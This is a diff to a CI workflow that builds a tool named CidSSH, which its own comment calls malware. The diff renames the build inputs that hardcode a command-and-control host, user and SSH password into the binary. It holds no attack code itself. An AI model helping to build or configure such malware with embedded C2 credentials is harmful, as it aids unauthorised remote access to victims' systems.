@@ -8,8 +8,9 @@ on:
 
 # Hardcode C2_IP and C2 SSH password so the CI builds everything for you
 env:
-  C2_IP: ""
-  PASSWORD_AUTH: ""
+  CID_C2_HOST: ""
+  CID_C2_USER: ""
+  CID_C2_PASSWORD: ""
 
 jobs:
     build:
@@ -21,23 +22,30 @@ jobs:
                   submodules: true
 
             - uses: haya14busa/action-cond@v1
-              id: c2IPCondval
+              id: CidC2HostCondval
               with:
-                cond: "${{ env.C2_IP == '' }}"
+                cond: "${{ env.CID_C2_HOST == '' }}"
                 if_true: ""
-                if_false: "-DC2_IP=${{ env.C2_IP }}"
+                if_false: "-DCID_C2_HOST=\"${{ env.CID_C2_HOST }}\""
 
             - uses: haya14busa/action-cond@v1
-              id: passwordCondval
+              id: CidUserCondval
               with:
-                cond: "${{ env.PASSWORD_AUTH == '' }}"
+                cond: "${{ env.CID_C2_USER == '' }}"
                 if_true: ""
-                if_false: "-DPASSWORD_AUTH=${{ env.PASSWORD_AUTH }}"
+                if_false: "-DCID_C2_USER=\"${{ env.CID_C2_USER }}\""
+
+            - uses: haya14busa/action-cond@v1
+              id: CidPasswordCondval
+              with:
+                cond: "${{ env.CID_C2_PASSWORD == '' }}"
+                if_true: ""
+                if_false: "-DCID_C2_PASSWORD=\"${{ env.CID_C2_PASSWORD }}\""
 
             - name: Build CidSSH
               uses: docker://alpine:edge
               with: 
-                  args: sh ./build.sh ${{ steps.c2IPCondval.outputs.value }} ${{ steps.passwordCondval.outputs.value }}
+                  args: sh ./build.sh ${{ steps.CidC2HostCondval.outputs.value }} ${{ steps.CidPasswordCondval.outputs.value }} ${{ steps.CidUserCondval.outputs.value }}
                
             #- name: Strip symbols from created malware
             #  run: |
